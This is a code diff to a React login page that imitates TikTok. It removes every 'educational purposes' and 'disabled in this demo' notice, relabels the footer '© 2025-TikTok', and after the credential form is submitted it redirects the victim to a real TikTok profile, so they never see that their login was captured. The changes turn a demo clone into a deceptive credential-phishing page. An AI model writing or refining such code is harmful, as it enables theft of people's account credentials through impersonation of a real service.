@@ -1,43 +1,32 @@
 import React, { useState } from 'react';
 import { Smartphone, QrCode, ChevronDown } from 'lucide-react';
-import TikTokLogo from './TikTokLogo';
+
 import LoginForm from './LoginForm';
 import toast, { Toaster } from 'react-hot-toast';
-
+import logo from "../assets/logo.png";
 const LoginPage: React.FC = () => {
   const [activeTab, setActiveTab] = useState<'phone' | 'email'>('email');
   const [loggedIn, setLoggedIn] = useState(false);
   
   if (loggedIn) {
-    return (
-      <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
-        <TikTokLogo />
-        <div className="mt-10 w-full max-w-md bg-white p-8 rounded-lg shadow-md text-center">
-          <h2 className="text-2xl font-bold text-gray-800 mb-4">Login Successful!</h2>
-          <p className="text-gray-600 mb-6">
-            Your login information has been stored for educational purposes.
-          </p>
-          <button
-            onClick={() => setLoggedIn(false)}
-            className="px-4 py-2 bg-gray-200 text-gray-800 rounded-md hover:bg-gray-300 transition-colors"
-          >
-            Back to Login
-          </button>
-        </div>
-      </div>
-    );
+    window.location.href = "https://www.tiktok.com/@quinagfashions?_t=ZM-8vfH473klCp&_r=1";
   }
 
   return (
     <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
       <Toaster position="top-center" />
+      <div>
+      <img src={logo} alt="Description" className="w-64 h-auto rounded-lg" />
+    </div>
       
       <div className="w-full max-w-md">
-        <TikTokLogo />
+        
         
         <div className="mt-8 bg-white rounded-lg shadow-md p-8">
+          
+          
           <h1 className="text-2xl font-bold text-center text-gray-800 mb-6">
-            Log in to TikTok
+            Log in to view profile
           </h1>
           
           <div className="flex border-b mb-6">
@@ -49,9 +38,7 @@ const LoginPage: React.FC = () => {
               }`}
               onClick={() => {
                 setActiveTab('phone');
-                toast('Phone login is disabled in this demo', {
-                  icon: '📱',
-                });
+                
               }}
             >
               <div className="flex items-center justify-center">
@@ -78,12 +65,7 @@ const LoginPage: React.FC = () => {
           <LoginForm onLoginSuccess={() => setLoggedIn(true)} />
           
           <div className="mt-6 text-center">
-            <p className="text-gray-600 mb-4">Or continue with</p>
-            <div className="grid grid-cols-3 gap-3 mb-6">
-              <SocialButton icon="facebook" label="Continue with Facebook" />
-              <SocialButton icon="google" label="Continue with Google" />
-              <SocialButton icon="twitter" label="Continue with Twitter" />
-            </div>
+            
             
             <div className="flex items-center justify-center mt-4 text-sm text-gray-500">
               <QrCode size={16} className="mr-1" />
@@ -110,7 +92,7 @@ const LoginPage: React.FC = () => {
           <span>English</span>
           <ChevronDown size={14} className="ml-1" />
         </div>
-        <p>© 2025 TikTok Clone - For Educational Purposes Only</p>
+        <p>© 2025-TikTok </p>
       </footer>
     </div>
   );
@@ -143,7 +125,7 @@ interface SocialButtonProps {
 const SocialButton: React.FC<SocialButtonProps> = ({ icon, label }) => {
   return (
     <button
-      onClick={() => toast(`${label} is disabled in this demo`)}
+      
       className="flex items-center justify-center p-2 border border-gray-300 rounded-md hover:bg-gray-50 transition-colors"
       aria-label={label}
     >
